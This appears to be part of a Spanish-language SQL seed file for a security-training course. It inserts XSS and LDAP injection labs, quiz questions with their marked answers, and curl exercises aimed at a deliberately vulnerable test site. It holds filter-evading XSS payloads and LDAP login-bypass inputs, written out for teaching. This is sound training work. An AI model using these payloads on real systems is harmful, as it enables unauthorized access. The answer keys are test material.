INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 1, 'multiple_choice',
  '¿Cuál es la diferencia fundamental entre XSS Reflected y XSS Stored?',
  'En XSS Stored el payload se guarda en la base de datos y afecta a todos los usuarios que visiten esa página, multiplicando el impacto. En XSS Reflected el payload solo afecta a quien hace clic en la URL maliciosa.'
FROM laboratories l WHERE l.slug = 'xss-cross-site-scripting'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 2, 'multiple_choice',
  '¿A quién ataca principalmente XSS, a diferencia del SQL Injection?',
  'XSS ataca al navegador del usuario que visita la página infectada. El código JavaScript malicioso se ejecuta en el contexto de la víctima, no en el servidor. SQLi ataca la base de datos del servidor.'
FROM laboratories l WHERE l.slug = 'xss-cross-site-scripting'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 3, 'multiple_choice',
  '¿Qué propiedad de una cookie impide que JavaScript pueda leerla, mitigando el robo de sesión por XSS?',
  'El flag HttpOnly en una cookie le indica al navegador que esa cookie no debe ser accesible desde JavaScript (document.cookie). Aunque haya XSS, el script malicioso no puede robar esa cookie.'
FROM laboratories l WHERE l.slug = 'xss-cross-site-scripting'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 4, 'multiple_choice',
  '¿Qué header HTTP permite al servidor indicar al navegador qué fuentes de scripts son confiables?',
  'Content-Security-Policy (CSP) es un header HTTP que define qué orígenes pueden cargar scripts, estilos e imágenes. Un CSP estricto puede bloquear la ejecución de scripts XSS inyectados.'
FROM laboratories l WHERE l.slug = 'xss-cross-site-scripting'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 5, 'activity_response',
  'Verifica si un campo de búsqueda es vulnerable a XSS reflected usando curl para inyectar un payload básico. Copia la respuesta generada.',
  'Buscar el payload XSS en el HTML de respuesta con grep confirma que la app refleja el input sin sanitizar. En un navegador real, ese script se ejecutaría automáticamente al cargar la página.'
FROM laboratories l WHERE l.slug = 'xss-cross-site-scripting'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

-- Opciones Q1
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Stored persiste en la base de datos y afecta a todos los visitantes; Reflected solo afecta a quien sigue la URL maliciosa', TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'xss-cross-site-scripting' AND q.question_order = 1 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Reflected es más peligroso porque modifica el servidor directamente', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'xss-cross-site-scripting' AND q.question_order = 1 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Son idénticos, solo difieren en la URL utilizada', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'xss-cross-site-scripting' AND q.question_order = 1 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Stored solo funciona en formularios; Reflected solo en URLs', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'xss-cross-site-scripting' AND q.question_order = 1 ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q2
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Al navegador del usuario que visita la página infectada', TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'xss-cross-site-scripting' AND q.question_order = 2 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Al servidor web directamente', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'xss-cross-site-scripting' AND q.question_order = 2 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'A la base de datos de la aplicación', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'xss-cross-site-scripting' AND q.question_order = 2 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Al sistema operativo del servidor', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'xss-cross-site-scripting' AND q.question_order = 2 ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q3
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'HttpOnly', TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'xss-cross-site-scripting' AND q.question_order = 3 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Secure', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'xss-cross-site-scripting' AND q.question_order = 3 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'SameSite=Strict', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'xss-cross-site-scripting' AND q.question_order = 3 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Expires', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'xss-cross-site-scripting' AND q.question_order = 3 ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q4
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Content-Security-Policy (CSP)', TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'xss-cross-site-scripting' AND q.question_order = 4 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'X-Frame-Options', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'xss-cross-site-scripting' AND q.question_order = 4 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Strict-Transport-Security (HSTS)', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'xss-cross-site-scripting' AND q.question_order = 4 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'X-Content-Type-Options', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'xss-cross-site-scripting' AND q.question_order = 4 ON CONFLICT (question_id, option_order) DO NOTHING;

-- Actividad Q5
INSERT INTO question_activities (question_id, title, instructions_markdown, expected_action_key, success_feedback, is_published)
SELECT q.id,
  'Detección de XSS Reflected con curl',
  E'## Objetivo\n\nUsa curl para enviar un payload XSS a un endpoint de búsqueda y verifica si la respuesta refleja el script sin sanitizar, confirmando la vulnerabilidad.\n\n## Instrucciones\n\n```bash\ncurl -s "http://testphp.vulnweb.com/search.php?test=<script>alert(1)</script>" | grep -i "script"\n```\n\n**Desglose:**\n- `-s`: modo silencioso\n- `?test=<script>alert(1)</script>`: payload XSS básico en el parámetro\n- `| grep -i "script"`: busca el payload en el HTML de respuesta\n\n**Interpretación del resultado:**\n- Si el grep devuelve una línea con `<script>alert(1)</script>` sin escapar → **XSS confirmado**\n- Si devuelve `&lt;script&gt;` → el output está escapado → **no vulnerable** (o al menos con esa protección)\n\n**Payloads alternativos para evadir filtros básicos:**\n```bash\n# Sin el tag script (para filtros que bloquean la palabra "script")\ncurl -s "http://testphp.vulnweb.com/search.php?test=<img src=x onerror=alert(1)>"\n\n# Con mayúsculas mixtas\ncurl -s "http://testphp.vulnweb.com/search.php?test=<ScRiPt>alert(1)</ScRiPt>"\n```\n\nCopia la **respuesta generada** y úsala en el quiz.',
  'curl -s "http://testphp.vulnweb.com/search.php?test=<script>alert(1)</script>" | grep -i "script"',
  '¡Correcto! Has verificado si el parámetro refleja el payload XSS. Copia esta respuesta para el quiz.',
  TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'xss-cross-site-scripting' AND q.question_order = 5
ON CONFLICT (question_id) DO NOTHING;

-- ── Lab 4: LDAP Injection y defensa integral ──────────────────────────────────

INSERT INTO laboratories (module_id, slug, title, content_markdown, position, estimated_minutes, points, is_published)
SELECT cm.id,
  'ldap-injection-defensa',
  'LDAP Injection y Estrategia de Defensa Integral',
  E'## ¿Qué es LDAP Injection?\n\n**LDAP (Lightweight Directory Access Protocol)** es el protocolo estándar para consultar directorios de usuarios en entornos empresariales (Active Directory, OpenLDAP). Muchas aplicaciones corporativas usan LDAP para autenticar usuarios.\n\n**LDAP Injection** ocurre cuando el input del usuario se inserta sin sanitización en una consulta LDAP, permitiendo al atacante modificar la lógica de búsqueda.\n\n## Consulta LDAP vulnerable\n\n```python\n# ❌ VULNERABLE\nldap_filter = "(&(uid=" + username + ")(password=" + password + "))"\n# Con username = "admin)(&)" y password = "cualquier_cosa"\n# Resultado: (&(uid=admin)(&)(password=cualquier_cosa))\n#                         ↑ el (&) vacío siempre es verdadero\n```\n\n## Caracteres especiales en LDAP\n\n| Carácter | Significado en LDAP |\n|---|---|\n| `*` | Wildcard: cualquier valor |\n| `(` `)` | Delimitan filtros |\n| `&` | AND lógico |\n| `\\|` | OR lógico |\n| `!` | NOT lógico |\n| `\\` | Carácter de escape |\n\n## Payloads clásicos de LDAP Injection\n\n```\n# Login bypass — el * como wildcard en la contraseña\nusername: admin\npassword: *\n\n# Extraer todos los usuarios\nusername: *\npassword: *\n\n# Bypass con filtro siempre verdadero\nusername: admin)(&\npassword: cualquier_cosa\n```\n\n## Comparación de inyecciones\n\n| Tipo | Objetivo del ataque | Lenguaje inyectado |\n|---|---|---|\n| SQL Injection | Base de datos relacional | SQL |\n| Command Injection | Sistema operativo | Bash/CMD |\n| XSS | Navegador del usuario | JavaScript |\n| LDAP Injection | Directorio de usuarios | Filtros LDAP |\n| NoSQL Injection | Base de datos NoSQL | JSON/operadores |\n\n## Defensa integral contra inyecciones (OWASP 2025)\n\n### 1. Validación de entrada (allowlist)\n```python\nimport re\n# Solo permitir caracteres alfanuméricos y guion bajo\nif not re.match(r''^[a-zA-Z0-9_]{3,30}$'', username):\n  raise ValueError("Usuario inválido")\n```\n\n### 2. Escapado de caracteres especiales\n```python\nimport ldap3\n# Escapar automáticamente los caracteres especiales LDAP\nsafe_username = ldap3.utils.conv.escape_filter_chars(username)\n```\n\n### 3. Principio de mínimo privilegio en la DB\n```sql\n-- La cuenta de app solo puede SELECT, no DROP ni UPDATE\nGRANT SELECT ON users TO app_user;\n```\n\n### 4. WAF (Web Application Firewall)\nUn WAF analiza el tráfico HTTP y bloquea patrones de inyección conocidos, añadiendo una capa de defensa adicional.\n\n---\nCompleta el quiz y la actividad para ganar **250 puntos**.',
  2, 35, 250, TRUE
FROM course_modules cm WHERE cm.slug = 'xss-otras-inyecciones'
ON CONFLICT (module_id, slug) DO UPDATE SET
  title = EXCLUDED.title, content_markdown = EXCLUDED.content_markdown,
  position = EXCLUDED.position, estimated_minutes = EXCLUDED.estimated_minutes,
  points = EXCLUDED.points, is_published = EXCLUDED.is_published;

-- Preguntas Lab 4

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 1, 'multiple_choice',
  '¿Qué carácter actúa como wildcard en una consulta LDAP, coincidiendo con cualquier valor?',
  'El asterisco (*) en LDAP es un comodín que coincide con cualquier cadena de caracteres. Usar "*" como contraseña en una app LDAP vulnerable puede permitir autenticarse como cualquier usuario.'
FROM laboratories l WHERE l.slug = 'ldap-injection-defensa'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 2, 'multiple_choice',
  '¿Qué protocolo empresarial de directorio de usuarios es el objetivo principal del LDAP Injection?',
  'Active Directory de Microsoft y OpenLDAP son los directorios de usuarios más comunes en entornos empresariales. Ambos usan LDAP como protocolo de consulta. Comprometer LDAP puede dar acceso a toda la infraestructura corporativa.'
FROM laboratories l WHERE l.slug = 'ldap-injection-defensa'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 3, 'multiple_choice',
  '¿Cuál de estas estrategias de defensa valida el input usando una lista de caracteres PERMITIDOS en lugar de intentar bloquear los maliciosos?',
  'La validación por allowlist (lista blanca) define exactamente qué caracteres son válidos y rechaza todo lo demás. Es más segura que la denylist porque los atacantes pueden encontrar formas de evadir los filtros de bloqueo.'
FROM laboratories l WHERE l.slug = 'ldap-injection-defensa'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 4, 'multiple_choice',
  '¿Por qué es importante aplicar el principio de mínimo privilegio a la cuenta de base de datos que usa la aplicación?',
  'Si la app solo tiene permiso SELECT, un atacante que explote un SQLi no podrá ejecutar DROP TABLE ni UPDATE. El daño queda limitado a lectura de datos. Con una cuenta de db_owner o root, el atacante tendría control total.'
FROM laboratories l WHERE l.slug = 'ldap-injection-defensa'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 5, 'activity_response',
  'Verifica los headers de seguridad HTTP de un sitio web para evaluar si tiene protecciones anti-XSS y CSP configuradas. Copia la respuesta generada.',
  'Los headers de seguridad como Content-Security-Policy, X-XSS-Protection y X-Content-Type-Options son la primera línea de defensa contra XSS e inyecciones en el navegador. Auditarlos es parte del proceso de evaluación de seguridad.'
FROM laboratories l WHERE l.slug = 'ldap-injection-defensa'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

-- Opciones Q1
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'El asterisco (*)', TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'ldap-injection-defensa' AND q.question_order = 1 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'El símbolo de porcentaje (%)', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'ldap-injection-defensa' AND q.question_order = 1 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'El signo de interrogación (?)', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'ldap-injection-defensa' AND q.question_order = 1 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'El guion bajo (_)', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'ldap-injection-defensa' AND q.question_order = 1 ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q2
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Active Directory y OpenLDAP', TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'ldap-injection-defensa' AND q.question_order = 2 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'MySQL y PostgreSQL', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'ldap-injection-defensa' AND q.question_order = 2 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Redis y MongoDB', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'ldap-injection-defensa' AND q.question_order = 2 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Apache Kafka y RabbitMQ', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'ldap-injection-defensa' AND q.question_order = 2 ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q3
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Validación por allowlist (lista blanca de caracteres permitidos)', TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'ldap-injection-defensa' AND q.question_order = 3 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Validación por denylist (lista negra de caracteres bloqueados)', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'ldap-injection-defensa' AND q.question_order = 3 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Cifrar el input del usuario antes de procesarlo', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'ldap-injection-defensa' AND q.question_order = 3 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Limitar el input a 255 caracteres máximo', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'ldap-injection-defensa' AND q.question_order = 3 ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q4
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Limitar el impacto: con solo SELECT, un SQLi no puede borrar datos ni ejecutar comandos', TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'ldap-injection-defensa' AND q.question_order = 4 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Previene completamente que ocurra el SQL Injection', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'ldap-injection-defensa' AND q.question_order = 4 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Hace que las consultas sean más rápidas', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'ldap-injection-defensa' AND q.question_order = 4 ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Evita que los atacantes encuentren el endpoint de la API', FALSE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'ldap-injection-defensa' AND q.question_order = 4 ON CONFLICT (question_id, option_order) DO NOTHING;

-- Actividad Q5
INSERT INTO question_activities (question_id, title, instructions_markdown, expected_action_key, success_feedback, is_published)
SELECT q.id,
  'Auditoría de headers de seguridad HTTP',
  E'## Objetivo\n\nInspecciona los headers de seguridad HTTP de un sitio para evaluar si tiene configuradas las defensas anti-inyección y anti-XSS correctamente.\n\n## Instrucciones\n\n```bash\ncurl -s -I https://httpbin.org | grep -iE "content-security|x-xss|x-content-type|x-frame"\n```\n\n**Desglose:**\n- `-I`: solicita solo los headers (HEAD request)\n- `grep -iE`: búsqueda case-insensitive con expresión regular\n- Filtra los headers de seguridad más importantes\n\n**Headers de seguridad a buscar:**\n\n| Header | Protege contra |\n|---|---|\n| `Content-Security-Policy` | XSS, inyección de scripts |\n| `X-XSS-Protection` | XSS en navegadores antiguos |\n| `X-Content-Type-Options: nosniff` | MIME sniffing |\n| `X-Frame-Options` | Clickjacking |\n| `Strict-Transport-Security` | Downgrade a HTTP |\n\n**Interpretación:**\n- Si el comando devuelve resultados → el sitio tiene headers de seguridad configurados ✓\n- Si no devuelve nada → ausencia de headers de seguridad → superficie de ataque mayor ✗\n\n**Para ver TODOS los headers de respuesta:**\n```bash\ncurl -s -I https://httpbin.org\n```\n\nCopia la **respuesta generada** y úsala en el quiz.',
  'curl -s -I https://httpbin.org | grep -iE "content-security|x-xss|x-content-type|x-frame"',
  '¡Muy bien! Has auditado los headers de seguridad del sitio. Copia esta respuesta para el quiz.',
  TRUE
FROM laboratory_questions q JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'ldap-injection-defensa' AND q.question_order = 5
ON CONFLICT (question_id) DO NOTHING;

-- =============================================================================
-- FIN DEL SEED
-- Resumen de contenido insertado:
--   Cursos:       1 nuevo (OWASP A05 — Inyección, intermedio)
--   Módulos:      2 nuevos
--   Laboratorios: 4 nuevos
--     · sql-injection-basico      → 200 pts
--     · command-injection         → 280 pts
--     · xss-cross-site-scripting  → 220 pts
--     · ldap-injection-defensa    → 250 pts
--   Preguntas:    20 nuevas (16 opción múltiple + 4 actividad)
--   Actividades:  4 nuevas
--   Puntos totales disponibles: 950
-- =============================================================================